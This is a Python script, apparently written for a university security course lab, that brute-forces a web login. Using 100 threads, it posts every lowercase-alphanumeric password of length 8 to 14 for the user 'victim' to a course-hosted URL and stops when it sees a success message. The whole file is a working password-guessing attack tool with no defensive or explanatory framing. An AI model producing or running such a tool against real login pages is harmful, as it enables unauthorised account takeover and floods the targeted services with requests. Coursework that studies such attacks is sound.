import itertools
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

# chosen number of threads to use
NUM_THREADS = 100

# post a password attempt to the target url
def attempt(password_attempt):

    # user, password combination to try
    payload = {
        "username": "victim",
        "password": password_attempt
    }

    # post the combination to the target url
    try:
        r = requests.post("http://cpsc4200.mpese.com/sqlinject/2", data=payload)

        # if the password was succesful, print it and return it
        if "Login successful!" in r.text:
            print("Password found: " + password_attempt)
            return password_attempt
    except Exception as e:
        print(f"Error with request: {e}")
        return None

# generate all possible passwords of a given length
def generate_password(length):
    for password_attempt in itertools.product("abcdefghijklmnopqrstuvwxyz0123456789", repeat=length):
        yield ''.join(password_attempt)

if __name__ == "__main__":

    # try all possible passwords of lengths 8-14
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        for length in range(8, 15):
            results = executor.map(attempt, generate_password(length), chunksize=1000)
            for result in results:
                if result:
                    executor.shutdown(wait=False)
                    sys.exit()
